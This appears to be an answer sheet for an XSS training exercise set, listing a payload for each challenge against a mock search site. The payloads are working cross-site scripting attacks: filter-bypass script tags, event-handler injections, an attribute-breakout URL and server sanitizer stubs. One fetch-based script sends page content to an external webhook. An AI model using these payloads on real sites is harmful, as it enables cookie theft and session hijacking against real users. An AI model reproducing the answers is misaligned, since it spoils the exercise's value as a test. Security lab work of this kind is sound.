# 0. Welcome

N/A

# 1. A Truly Disruptive Startup (3 points)

```
<script>succes(document.cookie)</script>
```

# 2. No Script Allowed (3 points)

```
<script><script>success(document.cookie)</script>
```

# 3. One More Time, Like You Mean It (3 points)

```
<scrscriptipt>success(document.cookie)</scrscriptipt>
```

# 4. An Open-and-Shut Case (3 points)

```
<SCRIPT>success(document.cookie)</SCRIPT>
```

# 5. Time to Mix Things Up (3 points)

```
<ScRipT>success(document.cookie)</ScRipT>
```

# 6. A Picture is Worth a Thousand Words (3 points)

```
<a href="java:void(0)" onclick="java:success(document.cookie)">Ən yeni meyxanalara qulaq asmaq üçün tıkla</a>
```

# 7. Between a Rock And a Hard Place (3 points)

```
<a href="java:void(0)" onclick="java:success(document.cookie)">Ən yeni meyxanalara qulaq asmaq üçün tıkla</a>
```

# 8. Angle of Death (6 points)

Attack input:

```
<<script>>success(document.cookie)</script>
```

Server code:

js
router.get('/search', async (req, res) => {
  let q = req.query.q
  if (q == null) q = ''

  // TODO: Replace this with your solution.

  // q = ???
     q = q.replace(/</i, '')

  const results = await getResults(q)
  res.render('caloogle-search-page', { q, results })
})


# 9. All in a Day's Work

N/A

# 10. In the Wrong Place at the Wrong Time (3 points)

```
<iframe src="#" svg onload=success(document.cookie)>
```

# 11. You Can't Win 'em All (6 points)

Attack input:

```
<iframe src="#" svg onload=success(document.cookie)>
```

Server code:

js
router.get('/search', async (req, res) => {
  let q = req.query.q
  if (q == null) q = ''

  // TODO: Replace this with your solution.
  // q = ???

  const results = await getResults(q)
  res.render('caloogle-search-page', { q, results })
})


# 12. When All is Said and Done (6 points)

Attack input:

```
'><script>success(document.cookie)</script>
```

Server code:

js
router.get('/search', async (req, res) => {
  let q = req.query.q
  if (q == null) q = ''

  // TODO: Replace this with your solution.
  // q = ???

  const results = await getResults(q)
  res.render('caloogle-search-page', { q, results })
})


# 13. When You Want a Job Done Right

N/A

# 14. Here Today and Gone Tomorrow (3 points)

Attack URL:

```
http://caloogle.xyz:4140/search?q=Meyxana&lang=es" onload=success(document.cookie)
```

**This should be a URL!**


# 15. The Early Bird Catches the Worm (3 points)

```
</Script><script>success(document.cookie)</script>
```

# 16. Tying Up Loose Ends (3 points)

```
<<//Script><script>success(document.cookie)<<//script>
```

# 17. Take a Page Out of Their Book (6 points)

Attack code:

js:
```
function send(payload) {
    fetch('/comment', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({text: 'http://google.com/', id: "1);success("})
    }).then((response) => response.clone().text())
    .then((data) => console.log(data));
}

send('<script> payload = document.documentElement.innerHTML; window.location="https://webhook.site/my-private-id?query=" + encodeURIComponent(payload); </script>')
```

```
<script>/*success(document.cookie)*/</script>
```

# 18. Congrats

N/A

# Əlavə qeydlər


Əlavə qeydlərinizi yazın
